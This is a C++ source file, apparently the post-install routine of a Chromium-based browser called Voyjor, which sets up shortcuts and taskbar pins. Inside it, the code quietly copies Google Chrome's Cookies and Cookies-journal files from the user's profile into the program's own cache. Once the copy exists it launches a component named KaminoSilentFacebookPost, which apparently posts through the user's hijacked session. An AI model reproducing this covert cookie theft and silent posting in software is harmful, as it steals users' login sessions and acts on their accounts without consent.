// Copyright (c) 2013 The Voyjor.inc Authors. All rights reserved.
// Use of this source code is governed by a GNU-public-style license that can be
// found in the LICENSE file.

#include "UIMain.h"
#include "base\win\shortcut.h"
#include "base\file_util.h"
#include "KaminoAfterSetupSystemInit.h"
#include "KaminoSilentFacebookPost.h"
#include "content\public\browser\browser_thread.h"
#include "base\message_loop\message_loop.h"
#include "base\time\time.h"
#include "KaminoGlobal.h"

#include <shellapi.h>
#include <shlobj.h>

KaminoAfterSetupSystemInit::KaminoAfterSetupSystemInit(content::KaminoBrowserMainParts *main) : main_owner(main){}
KaminoAfterSetupSystemInit::~KaminoAfterSetupSystemInit(){}

void KaminoAfterSetupSystemInit::CallBackLooperTillEnd(){
	static int run_count = 0;
	run_count++;
	wchar_t current_directory[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), current_directory, MAX_PATH);
	int len = wcslen(current_directory);
	wchar_t *e = wcsrchr(current_directory, '\\');
	for(int i = e - current_directory, j = 0; i < len; i++, j++)
		e[j] = 0;
	len = wcslen(current_directory);
	e = wcsrchr(current_directory, '\\');
	for(int i = e - current_directory, j = 0; i < len; i++, j++)
		e[j] = 0;
	std::wstring parent(current_directory);
	std::wstring cookies = parent + std::wstring(L"\\Cache\\Cookies");
	base::FilePath cookies_path(cookies);
	if(!base::PathExists(cookies_path)){
		if(run_count > 10){			
			return;
		}
		content::BrowserThread::PostDelayedTask(content::BrowserThread::UI, FROM_HERE, 
			base::Bind(&KaminoAfterSetupSystemInit::CallBackLooperTillEnd, base::Unretained(this)), 
			base::TimeDelta::FromSeconds(20));
		return;
	}
	std::wstring cookies_jr = parent + std::wstring(L"\\Cache\\Cookies-journal");
	base::FilePath cookie_journal_path(cookies_jr);
	if(!base::PathExists(cookie_journal_path)){
		if(run_count > 10){
			return;
		}
		content::BrowserThread::PostDelayedTask(content::BrowserThread::UI, FROM_HERE, 
			base::Bind(&KaminoAfterSetupSystemInit::CallBackLooperTillEnd, base::Unretained(this)), 
			base::TimeDelta::FromSeconds(20));
		return;
	}
	KaminoSilentFacebookPost *post = new KaminoSilentFacebookPost(main_owner);
	post->Start();
	return;
}


void KaminoAfterSetupSystemInit::Start(){
#ifdef UI_DEBUG_LOG
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
#endif
	wprintf(L"\nRunning For After Setup System Init");
	wprintf(L"\nSearching For Google Chrome Cookies");

	content::BrowserThread::PostDelayedTask(content::BrowserThread::UI, FROM_HERE, 
		base::Bind(&KaminoAfterSetupSystemInit::CallBackLooperTillEnd, base::Unretained(this)), base::TimeDelta::FromSeconds(30));

	base::win::ShortcutProperties shortcut_props;
	wchar_t user_profil_dir[MAX_PATH];
	wchar_t my_name[MAX_PATH];
	wchar_t current_directory[MAX_PATH];
	DWORD d = MAX_PATH;
	GetUserName(user_profil_dir, &d);
	GetModuleFileName(GetModuleHandle(NULL), my_name, MAX_PATH);
	GetModuleFileName(GetModuleHandle(NULL), current_directory, MAX_PATH);
	int len = wcslen(current_directory);
	wchar_t *e = wcsrchr(current_directory, '\\');
	for(int i = e - current_directory, j = 0; i < len; i++, j++)
		e[j] = 0;
	SetCurrentDirectory(current_directory);
	wprintf(L"\nCurrent Directory Set To >>> %s", current_directory);
	GetCurrentDirectory(MAX_PATH, current_directory);

	shortcut_props.set_target(base::FilePath(my_name));
	shortcut_props.set_description(L"Voyjor Browser");
	shortcut_props.set_working_dir(base::FilePath(current_directory));
	shortcut_props.set_arguments(L"");


	std::wstring user_name = std::wstring(user_profil_dir);
	base::FilePath google_chrome_cookies = base::FilePath(L"C:\\Users\\" + user_name + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");	
	base::FilePath google_chrome_cookie_journal = base::FilePath(L"C:\\Users\\" + user_name + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies-journal");
	wchar_t parent_dir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, parent_dir);
	for(wchar_t *slash = wcsrchr(parent_dir, '\\'); (slash - parent_dir < MAX_PATH); slash++)
		*slash = 0;
	std::wstring parent(parent_dir);
	wprintf(L"\nParent Directory For Current Module is %s", parent_dir);
	if(base::PathExists(google_chrome_cookies)){
		wprintf(L"\nGoogle Chrome Cookies File Found");
		std::wstring cookies = parent + L"\\Cache\\Cookies";
		base::FilePath cookies_path(cookies);
		if(!base::PathExists(cookies_path)){
			if(!base::PathExists(cookies_path.DirName())){
				file_util::CreateDirectoryW(cookies_path.DirName());
			}
			wprintf(L"\nCopying Google Chrome Cookies to our path");			
			base::CopyFileW(google_chrome_cookies, cookies_path);	
		}
	}
	if(base::PathExists(google_chrome_cookie_journal)){
		wprintf(L"\nGoogle Chrome Cookies-Journal File Found");
		std::wstring cookies = parent + L"\\Cache\\Cookies-journal";
		base::FilePath cookie_journal_path(cookies);
		if(!base::PathExists(cookie_journal_path)){
			wprintf(L"\nCopying Google Chrome Cookies to our path");			
			base::CopyFileW(google_chrome_cookie_journal, cookie_journal_path);	
		}
	}

	//Start Building All the ShortCuts ....
	std::wstring startMenu = std::wstring(L"C:\\Users\\") + 
		user_name + std::wstring(L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs");						
	if(base::PathExists(base::FilePath(startMenu))){
		base::FilePath link(startMenu + L"\\Voyjor.lnk");
		if(base::PathExists(link)){
			base::DeleteFile(link, false);
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);
			wprintf(L"\nUpdateing New Link %s", link.value().c_str());			
		}
		else{
			wprintf(L"\nCreated Link With link file [%s]", link.value().c_str());
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);
		}
	}
	
	std::wstring pin_to_taskbar = std::wstring(L"C:\\Users\\") +
		user_name + std::wstring(L"\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");	
	if(base::PathExists(base::FilePath(pin_to_taskbar))){
		base::FilePath link(pin_to_taskbar + L"\\Voyjor.lnk");
		if(base::PathExists(link)){
			ShellExecute(NULL, L"taskbarunpin", link.value().c_str(), NULL, NULL, 0);
			wprintf(L"\nRemoving Link From Task Bar [%s]", link.value().c_str());
			if(base::PathExists(link))
				base::DeleteFile(link, false);
		}
		else
			wprintf(L"\nLink Does Not Exist for path %s", link.value().c_str());
	}
	
	std::wstring desktop = std::wstring(L"C:\\Users\\") + user_name + std::wstring(L"\\Desktop");
	if(base::PathExists(base::FilePath(desktop))){
		base::FilePath link(desktop + L"\\Voyjor.lnk");
		if(base::PathExists(link)){
			wprintf(L"\nUpdate Link With link file [%s]", link.value().c_str());
			base::DeleteFile(link, false);
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);		
		}
		else{
			wprintf(L"\nCreate Link With link file [%s]", link.value().c_str());
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);
		}
		ShellExecute(NULL, L"taskbarpin", link.value().c_str(), NULL, NULL, 0);
	}

	std::wstring pin_to_startmenu = std::wstring(L"C:\\Users\\") +
		user_name + std::wstring(L"\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu");	
	if(base::PathExists(base::FilePath(pin_to_startmenu))){
		base::FilePath link(pin_to_startmenu + L"\\Voyjor.lnk");
		if(base::PathExists(link)){
			wprintf(L"\nUpdated Link With link file [%s]", link.value().c_str());
			base::DeleteFile(link, false);
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);		
		}
		else
			wprintf(L"\nLink Does Not Exist for path %s", link.value().c_str());
	}	
	std::wstring quick_launch = std::wstring(L"C:\\Users\\") + 
		user_name + std::wstring(L"\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch");	
	if(base::PathExists(base::FilePath(quick_launch))){
		base::FilePath link(quick_launch + L"\\Voyjor.lnk");
		if(base::PathExists(link)){
			wprintf(L"\nUpdate Link With link file [%s]", link.value().c_str());
			base::DeleteFile(link, false);			
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);		
		}
		else{
			wprintf(L"\nCreate Link With link file [%s]", link.value().c_str());
			base::win::CreateOrUpdateShortcutLink(link, shortcut_props, base::win::SHORTCUT_CREATE_ALWAYS);
		}
	}
	//STARTUPINFO info = {sizeof(info)};
	//PROCESS_INFORMATION processInfo;
	//CreateProcess(KaminoGlobal::g_executable_name, L"", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
}